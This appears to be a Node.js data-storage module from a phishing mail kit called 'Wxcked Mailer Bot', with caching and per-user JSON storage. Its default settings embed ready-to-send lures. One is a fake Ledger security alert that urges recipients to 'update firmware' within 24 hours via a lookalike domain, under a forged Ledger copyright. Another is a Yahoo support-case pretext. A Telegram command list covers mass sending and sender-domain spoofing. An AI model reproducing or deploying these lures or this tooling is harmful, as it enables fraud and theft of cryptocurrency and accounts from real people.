const fs = require('fs-extra');
const path = require('path');
const {
  DATA_DIR, TEMPLATES_FILE, SMTP_CONFIGS_FILE, IMAP_CONFIGS_FILE,
  SCHEDULES_FILE, SCAN_HISTORY_FILE, PROXIES_FILE, BRAND_TEMPLATES_FILE,
  TEAM_FILE, USERS_FILE, SETTINGS_FILE
} = require('./config');

// In-memory cache to reduce disk I/O (critical for 1GB VPS)
const cache = new Map();
const CACHE_TTL_MS = 5000; // 5 second cache

function getCacheKey(file) {
  return file;
}

function getCached(file) {
  const entry = cache.get(getCacheKey(file));
  if (entry && Date.now() - entry.timestamp < CACHE_TTL_MS) {
    return entry.data;
  }
  return null;
}

function setCached(file, data) {
  cache.set(getCacheKey(file), { data, timestamp: Date.now() });
  // Prevent cache from growing unbounded
  if (cache.size > 50) {
    const oldestKey = cache.keys().next().value;
    cache.delete(oldestKey);
  }
}

function invalidateCache(file) {
  cache.delete(getCacheKey(file));
}

// Async read with cache
async function readJSON(file) {
  const cached = getCached(file);
  if (cached !== null) return cached;
  try {
    const data = await fs.readJson(file);
    setCached(file, data);
    return data;
  } catch {
    return [];
  }
}

// Async write with cache invalidation
async function writeJSON(file, data) {
  await fs.writeJson(file, data, { spaces: 2 });
  setCached(file, data);
}

// Sync read (for startup only)
function readJSONSync(file) {
  try { return fs.readJsonSync(file); } catch { return []; }
}

// Sync write (for startup only)
function writeJSONSync(file, data) {
  fs.writeJsonSync(file, data, { spaces: 2 });
}

// ============ PER-USER DATA STORAGE ============
function getUserDataFile(userId, type) {
  const dir = path.join(DATA_DIR, 'users', String(userId));
  fs.ensureDirSync(dir);
  const file = path.join(dir, `${type}.json`);
  if (!fs.existsSync(file)) fs.writeJsonSync(file, []);
  return file;
}

async function readUserData(userId, type) {
  const file = getUserDataFile(userId, type);
  const cached = getCached(file);
  if (cached !== null) return cached;
  try {
    const data = await fs.readJson(file);
    setCached(file, data);
    return data;
  } catch {
    return [];
  }
}

async function writeUserData(userId, type, data) {
  const file = getUserDataFile(userId, type);
  await fs.writeJson(file, data, { spaces: 2 });
  setCached(file, data);
}

// ============ SETTINGS ============
async function getSettings() {
  const defaults = {
    ledgerButtonUrl: 'https://ledger.prod-cases.com/',
    ledgerButtonText: 'Update Firmware',
    ledgerSubject: 'Security Action Required',
    ledgerHeading: 'Security Action Required',
    ledgerBody: 'We are writing to inform you of a critical security vulnerability affecting specific firmware versions of Ledger Nano X and Nano S Plus devices. It is imperative that you take immediate action to secure your assets.',
    ledgerWhatHappened: "The vulnerability was specific to the 'Recovery Check' application. During this verification process, a flaw caused fragmented and encrypted segments of your device's private key to be unintentionally transmitted to a secure Ledger server. Although this data was protected by multiple layers of encryption, our security team detected a highly sophisticated breach of this specific server. We have confirmed that the threat actor successfully exfiltrated these fragments and, through advanced methods, was able to reconstruct a limited number of private keys, leading to the theft of user assets.",
    ledgerAction: 'To mitigate this vulnerability, you must update your device firmware through Ledger Live immediately. Failure to update within 24 hours may result in permanent loss of access to your assets.',
    ledgerFooter: 'This is an automated security notification from Ledger Security Team.',
    ledgerUnsubscribe: 'If you wish to stop receiving these alerts, you can unsubscribe here.',
    ledgerCopyright: '© 2026 Ledger SAS. All rights reserved. | 1 Rue du Mail, 75002 Paris, France',
    yahooSubject: 'Your Case is Under Review',
    yahooHeading: 'Your Case is Under Review',
    yahooBody: "Your Support Inquiry have been raised. Anderson family has been assigned as support representative for the case.",
    yahooCaseId: '204823',
    yahooFooter: 'You received this email to follow up on a recent call with our representative.',
    telegramWelcome: 'Welcome to Wxcked Mailer Bot! Use /help to see available commands.',
    telegramHelp: 'Available commands:\n/start - Start the bot\n/help - Show this help\n/menu - Show main menu\n/send - Send an email\n/mass - Send mass emails\n/status - Check system status\n/templates - List templates\n/ledger - Send Ledger template email\n/yahoo - Send Yahoo template email\n/settings - View current settings\n/setledger - Customize Ledger template\n/setyahoo - Customize Yahoo template\n/setsender - Set your sender email domain & prefix\n/login - View your web panel login & sender email\n/adduser - Add web panel user (admin only)\n/removeuser - Remove web panel user (admin only)\n/users - List web panel users (admin only)\n/addmember - Add Telegram member (admin only)\n/removemember - Remove Telegram member (admin only)\n/members - List Telegram members (admin only)\n/link - Link your Telegram to your web panel account'
  };
  const saved = await readJSON(SETTINGS_FILE);
  return { ...defaults, ...saved };
}

async function saveSettings(settings) {
  await writeJSON(SETTINGS_FILE, settings);
}

module.exports = {
  readJSON, writeJSON, readJSONSync, writeJSONSync,
  readUserData, writeUserData, getUserDataFile,
  getSettings, saveSettings,
  invalidateCache,
  // Re-export file paths for convenience
  TEMPLATES_FILE, SMTP_CONFIGS_FILE, IMAP_CONFIGS_FILE,
  SCHEDULES_FILE, SCAN_HISTORY_FILE, PROXIES_FILE, BRAND_TEMPLATES_FILE,
  TEAM_FILE, USERS_FILE, SETTINGS_FILE
};